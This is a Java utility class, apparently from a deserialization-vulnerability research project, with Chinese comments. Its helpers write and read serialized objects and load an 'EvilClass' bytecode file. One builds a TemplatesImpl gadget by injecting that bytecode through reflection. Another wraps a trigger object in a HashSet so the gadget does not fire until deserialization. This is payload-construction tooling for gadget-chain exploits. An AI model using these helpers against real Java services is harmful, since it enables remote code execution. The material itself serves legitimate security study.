package org.su18.serialize.utils;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;

/**
 * @author su18
 */
public class SerializeUtil {


	/**
	 * 将序列化对象写入到文件中
	 *
	 * @param o 对象
	 * @throws IOException 抛出 io 异常
	 */
	public static void writeObjectToFile(Object o) throws IOException {

		String className = CallUtil.getCallClassName();

		if (className != null) {
			FileOutputStream   fos = new FileOutputStream(genFilename(className));
			ObjectOutputStream oos = new ObjectOutputStream(fos);
			oos.writeObject(o);
			fos.flush();
			fos.close();
			oos.flush();
			oos.close();
		}
	}

	/**
	 * 从文件中读取序列化对象
	 *
	 * @return 返回序列化对象
	 * @throws IOException            抛出异常
	 * @throws ClassNotFoundException 抛出异常
	 */
	public static Object readFileObject() throws IOException, ClassNotFoundException {

		String className = CallUtil.getCallClassName();
		if (className != null) {

			ObjectInputStream ois = new ObjectInputStream(new FileInputStream(genFilename(className)));
			return ois.readObject();
		}

		return new Object();
	}


	/**
	 * 生成测试用恶意类字节码
	 *
	 * @return 返回恶意类字节码数组
	 */
	public static byte[] generateEvilClassForTest() throws Exception {
		InputStream inputStream = SerializeUtil.class.getResourceAsStream("../test/EvilClass.class");
		assert inputStream != null;
		byte[] bytes = new byte[inputStream.available()];
		inputStream.read(bytes);
		return bytes;
	}


	/**
	 * 构造反序列化 TemplatesImpl 类对象
	 *
	 * @return 返回 TemplatesImpl 对象
	 * @throws Exception 抛出异常
	 */
	public static TemplatesImpl generateTemplatesImpl() throws Exception {
		// 初始化 TemplatesImpl 对象
		TemplatesImpl tmpl      = new TemplatesImpl();
		Field         bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");
		bytecodes.setAccessible(true);
		bytecodes.set(tmpl, new byte[][]{generateEvilClassForTest()});
		// _name 不能为空
		Field name = TemplatesImpl.class.getDeclaredField("_name");
		name.setAccessible(true);
		name.set(tmpl, "su18");
		// _tfactory 不能为空，兼容多个版本
		Field factory = TemplatesImpl.class.getDeclaredField("_tfactory");
		factory.setAccessible(true);
		factory.set(tmpl, new TransformerFactoryImpl());

		return tmpl;
	}


	/**
	 * 根据类名生成序列化测试文件
	 *
	 * @return 返回类名
	 */
	public static String genFilename(String className) {
		String[] splits = className.split("\\.");
		return splits[splits.length - 1] + ".bin";
	}

	/**
	 * 生成用于反序列化的 HashSet，本质是使用反射将值写入其中的 HashMap 中
	 * 避免在序列化时触发 Gadget
	 *
	 * @param object 待写入的触发类
	 * @return 返回 HashSet
	 */
	public static HashSet<Object> generateHashSet(Object object) throws Exception {

		// 初始化一个 HashSet s
		HashSet<Object> set = new HashSet<>(1);
		set.add("su18");

		// 兼容不同版本 JDK
		Field f;
		try {
			f = HashSet.class.getDeclaredField("map");
		} catch (NoSuchFieldException e) {
			f = HashSet.class.getDeclaredField("backingMap");
		}

		f.setAccessible(true);
		HashMap innerMap = (HashMap) f.get(set);

		Field f2 = null;
		try {
			f2 = HashMap.class.getDeclaredField("table");
		} catch (NoSuchFieldException e) {
			f2 = HashMap.class.getDeclaredField("elementData");
		}

		f2.setAccessible(true);

		Object[] array = (Object[]) f2.get(innerMap);

		Object node = array[0];
		if (node == null) {
			node = array[1];
		}

		Field keyField;
		try {
			keyField = node.getClass().getDeclaredField("key");
		} catch (Exception e) {
			keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
		}

		keyField.setAccessible(true);
		keyField.set(node, object);

		return set;
	}

}
